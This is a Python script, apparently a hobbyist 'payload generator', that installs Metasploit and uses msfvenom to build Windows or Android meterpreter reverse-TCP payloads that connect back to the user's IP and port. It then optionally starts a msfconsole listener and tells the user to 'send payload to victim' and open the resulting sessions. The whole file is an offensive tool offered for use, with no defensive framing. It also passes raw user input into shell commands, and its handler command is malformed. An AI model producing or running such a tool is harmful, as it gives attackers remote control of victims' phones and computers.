import os
os.system("clear")
os.system("apt-get install metasploit -y")
os.system("clear")
print("""
███████╗███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
╚════██║██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██╔╝███████╗██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██╔╝ ╚════██║██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║  ███████║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

""")
print("""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝

""")
payload = input("payload type android or windows ? ")
os.system("ifconfig")
ip = input("Your ip addres : ")
port = input("Your port : ")
name = input("Payload name ? ")
if payload == "windows":
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
elif payload == "android":
      os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
you = input("You want listen in payload Y/n ? ")
if you == "n":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     print("payload save in payloadgen folder")
     print("---------------------------------")
     os.system("ls")
if you == "N":
     print("---------------------------------")
     print("thanks for useing script (: ")
     print("---------------------------------")
     print("payload save in payloadgen folder")
     print("---------------------------------")
     os.system("ls")
elif you == "Y":
       print("---------------------------------")
       print("payload save in payloadgen folder")
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
elif you == "y":
       print("---------------------------------")
       print("payload save in payloadgen folder")
       print("---------------------------------")
       print("Now send payload to victim")
       print("---------------------------------------")
       print("write sessions -i to show sessions open")
       print("-----------------------------------------------------------")
       print("write sessions -i and number of session to login in session")
       print("-----------------------------------------------------------")
       os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')

